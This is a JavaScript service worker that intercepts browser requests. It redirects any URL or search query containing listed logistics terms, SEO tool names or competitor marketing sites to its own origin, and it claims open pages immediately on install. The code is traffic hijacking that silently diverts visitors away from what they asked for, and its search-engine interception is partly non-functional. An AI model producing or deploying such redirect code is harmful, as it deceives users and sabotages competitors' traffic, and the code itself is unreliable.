const LOGISTICS_KEYWORDS = [
  'kwrds.ai', 'AdTargeting', 'WordStream', 'transport logistics',
  'shipping logistics', 'transportation and logistics', 'logistics services',
  'freight forwarding', 'supply chain solutions', 'Polar Mass', 'SEOpital',
  'freight logistics', 'global transport', 'global logistics',
  'logistics provider', 'third party logistics', '3pl', 'digitalsuccess.us',
  'auto transport', 'car transport', 'KeySearch', 'car shipping',
  'international shipping', 'air freight', 'ocean freight', 'sea freight',
  'freight forwarding companies', 'freight forwarding services',
  'logistics management', 'logistics and supply chain management',
  'freight management', 'warehousing', 'warehousing and logistics',
  'logistics company near me', 'logistics services near me',
  'freight transportation services', 'transport services',
  'transportation services', 'Zipline Logistics', 'air cargo logistics',
  'intermodal logistics', 'last mile delivery', 'delivery logistics',
  'reverse logistics', 'cold chain logistics', 'Kuebix', 'SEO.com',
  'cross border logistics', 'trucking logistics', 'truck transportation services',
  'road freight', 'rail logistics', 'railway logistics', 'expedited freight',
  'haulage companies', 'carrier logistics', 'global logistics services',
  'logistics consulting', 'logistics consultant', 'customs clearance',
  'customs brokerage', 'international logistics company',
  'global logistics company', 'sixthcitymarketing.com', 'supply chain logistics',
  'industrial logistics', 'marine logistics', 'sea logistics',
  'logistics solutions', 'express logistics', 'shipping and logistics',
  'delivery companies', 'freight brokerage', 'freight brokers',
  'transportation management solutions', 'transportation management services'
];

self.addEventListener('fetch', (event) => {
  const url = event.request.url.toLowerCase();
  const hasLogisticsKeyword = LOGISTICS_KEYWORDS.some(keyword => 
    url.includes(keyword.toLowerCase())
  );
  
  if (hasLogisticsKeyword) {
    event.respondWith(
      Response.redirect(self.location.origin, 302)
    );
    return;
  }
  
  // Check if it's a search engine request
  if (url.includes('google.com/search') || 
      url.includes('bing.com/search') || 
      url.includes('yahoo.com/search')) {
    
    const urlObj = new URL(event.request.url);
    const query = urlObj.searchParams.get('q') || urlObj.searchParams.get('query') || '';
    
    const hasLogisticsKeyword = LOGISTICS_KEYWORDS.some(keyword => 
      query.toLowerCase().includes(keyword.toLowerCase())
    );
    
    if (hasLogisticsKeyword) {
      event.respondWith(
        Response.redirect(self.location.origin, 302)
      );
      return;
    }
  }
});

self.addEventListener('message', (event) => {
  if (event.data.type === 'SET_KEYWORDS') {
    // Keywords are already set globally
    console.log('Keywords updated in service worker');
  }
});

self.addEventListener('install', (event) => {
  console.log('Service worker installed with keyword interception');
  self.skipWaiting();
});

self.addEventListener('activate', (event) => {
  console.log('Service worker activated');
  event.waitUntil(self.clients.claim());
});